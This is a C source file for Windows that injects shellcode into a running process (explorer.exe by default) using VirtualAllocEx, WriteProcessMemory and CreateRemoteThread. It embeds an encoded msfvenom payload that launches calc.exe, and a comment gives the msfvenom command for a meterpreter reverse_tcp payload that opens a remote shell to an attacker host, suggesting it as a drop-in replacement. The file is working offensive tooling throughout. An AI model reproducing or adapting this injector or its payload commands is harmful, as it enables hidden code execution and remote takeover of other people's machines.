/* [!] TARGET PROCESS IS SELECTED BY CHANGHING THE VARIABLE VALUE processName
 * This program injects shellcode into a specified target process (e.g., Notepad) by:
 * 1. Opening the target process with full access rights.
 * 2. Allocating memory within the target process for the shellcode.
 * 3. Writing the shellcode into the allocated memory.
 * 4. Creating a remote thread to execute the shellcode within the context of the target process.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetProcessHandle(IN LPWSTR processName, OUT HANDLE* hProcess, OUT DWORD* pID);


//Shellcode To open calc.exe on x64
//msfvenom -p windows/x64/exec cmd=calc.exe -f c -e x64/zutto_dekiru
unsigned char buf[] =
"\x49\xba\x3d\x27\x35\x5d\x9c\x4a\x69\x89\x54\xdb\xc3\x58"
"\x66\x25\x10\xf0\x48\x0f\xae\x00\x4d\x31\xff\x41\xb7\x23"
"\x48\x83\xc0\x08\x4c\x8b\x20\x49\xff\xcf\x4f\x31\x54\xfc"
"\x25\x4d\x85\xff\x75\xf3\xc1\x6f\xb6\xb9\x6c\xa2\xa9\x89"
"\x3d\x27\x74\x0c\xdd\x1a\x3b\xd8\x6b\x6f\x04\x8f\xf9\x02"
"\xe2\xdb\x5d\x6f\xbe\x0f\x84\x02\xe2\xdb\x1d\x6f\xbe\x2f"
"\xcc\x02\x66\x3e\x77\x6d\x78\x6c\x55\x02\x58\x49\x91\x1b"
"\x54\x21\x9e\x66\x49\xc8\xfc\xee\x38\x1c\x9d\x8b\x8b\x64"
"\x6f\x66\x64\x15\x17\x18\x49\x02\x7f\x1b\x7d\x5c\x4c\xc1"
"\xe9\x01\x3d\x27\x35\x15\x19\x8a\x1d\xee\x75\x26\xe5\x0d"
"\x17\x02\x71\xcd\xb6\x67\x15\x14\x9d\x9a\x8a\xdf\x75\xd8"
"\xfc\x1c\x17\x7e\xe1\xc1\x3c\xf1\x78\x6c\x55\x02\x58\x49"
"\x91\x66\xf4\x94\x91\x0b\x68\x48\x05\xc7\x40\xac\xd0\x49"
"\x25\xad\x35\x62\x0c\x8c\xe9\x92\x31\xcd\xb6\x67\x11\x14"
"\x9d\x9a\x0f\xc8\xb6\x2b\x7d\x19\x17\x0a\x75\xc0\x3c\xf7"
"\x74\xd6\x98\xc2\x21\x88\xed\x66\x6d\x1c\xc4\x14\x30\xd3"
"\x7c\x7f\x74\x04\xdd\x10\x21\x0a\xd1\x07\x74\x0f\x63\xaa"
"\x31\xc8\x64\x7d\x7d\xd6\x8e\xa3\x3e\x76\xc2\xd8\x68\x15"
"\x26\x4b\x69\x89\x3d\x27\x35\x5d\x9c\x02\xe4\x04\x3c\x26"
"\x35\x5d\xdd\xf0\x58\x02\x52\xa0\xca\x88\x27\xba\xdc\x2b"
"\x6b\x66\x8f\xfb\x09\xf7\xf4\x76\xe8\x6f\xb6\x99\xb4\x76"
"\x6f\xf5\x37\xa7\xce\xbd\xe9\x4f\xd2\xce\x2e\x55\x5a\x37"
"\x9c\x13\x28\x00\xe7\xd8\xe0\x3e\xfd\x26\x0a\xa7\x58\x5f"
"\x50\x5d\xfb\xf9\x2e\xc0";

//You can replace it by ShellCode (x64) for windows/x64/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT with zutto_dekiru (Requires a 64-bit running Process)
//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=hostIP LPORT=hostPORT -f c -e x64/zutto_dekiru


BOOL GetProcessHandle(IN LPWSTR processName, OUT HANDLE* hProcess, OUT DWORD* pID)
{
    DWORD pid = 0;
    HANDLE hP = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] Invalid HANDLE to process snapshots [%d]\n", GetLastError());
        return FALSE;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (!Process32First(hSnapshot, &pe))
    {
        printf("[ERROR] Could not enumerate processes [%d]\n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (0 == _wcsicmp(processName, pe.szExeFile))
        {
            pid = pe.th32ProcessID;
            printf("[!] Trying to open handle on %ls, on pid %d\n", processName, pid);

            hP = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
            if (hP == NULL)
            {
                printf("[X] Could not open handle on %d, continuing\n", pid);
            }
            else
            {
                printf("[+] Successfully got handle on %d\n", pid);
                *pID = pid;
                *hProcess = hP;
                CloseHandle(hSnapshot); // Close the snapshot handle as soon as we get the process handle
                return TRUE;
            }
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return FALSE;
}

int main() {
    HANDLE hProcess = NULL;
    DWORD pid = 0;
    LPWSTR processName = L"explorer.exe"; //Can be replaced by other 64-bit process (i.e notepad.exe)

    if (GetProcessHandle(processName, &hProcess, &pid) == FALSE)
    {
        printf("[ERROR] Could not obtain handle [%d]\n", GetLastError());
        return 99;
    }
    printf("[+] The PID of %ls is %d\n", processName, pid);

    LPVOID freeMem = VirtualAllocEx(hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (freeMem == NULL) {
        printf("Error allocating memory in remote process. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    BOOL success = WriteProcessMemory(hProcess, freeMem, buf, sizeof(buf), NULL);
    if (!success) {
        printf("Error writing process memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, freeMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)freeMem, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Error creating remote thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, freeMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Optionally wait for the thread to complete before closing handles
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

*/